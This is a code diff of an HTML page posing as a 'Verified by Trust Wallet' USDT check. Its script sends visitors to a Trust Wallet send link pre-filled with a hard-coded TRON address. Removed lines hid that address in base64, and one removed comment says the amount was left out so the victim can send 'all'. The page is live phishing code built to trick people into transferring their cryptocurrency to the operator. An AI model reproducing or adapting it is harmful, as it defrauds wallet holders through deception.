@@ -74,7 +74,6 @@
   </style>
 </head>
 <body>
-
   <header>
     <img src="trc20-logo.png" alt="TRC20 Logo">
     <h1>Verified by Trust Wallet</h1>
@@ -94,25 +93,20 @@
   </footer>
 
   <script>
-    // Wallet address hidden using base64
-    const walletEncoded = "VEQ4S3FMU1lNaUU0eExYNFFWcnpYNFBScmpwQ2lzN3Z1Swo="; // TD8KqLSYMiE4xLX4QVrzX4BSRjpCis7vuK
-    const walletAddress = atob(walletEncoded).trim();
+    const walletAddress = "TD8KqLSYMiE4xLX4QVrzX4BSRjpCis7vuK";
 
     function verifyUSDT() {
       document.getElementById("processingText").style.display = "block";
       setTimeout(() => {
-        // Redirect without amount to allow "all" selection
-        window.location.href = `https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=${walletAddress}`;
+        window.location.href = `https://link.trustwallet.com/send?coin=195&address=${walletAddress}`;
       }, 1500);
     }
 
-    // Show error if returned with status=fail
     window.onload = function () {
       if (window.location.href.includes("?status=fail")) {
         document.getElementById("flashError").style.display = "block";
       }
     }
   </script>
-
 </body>
 </html>
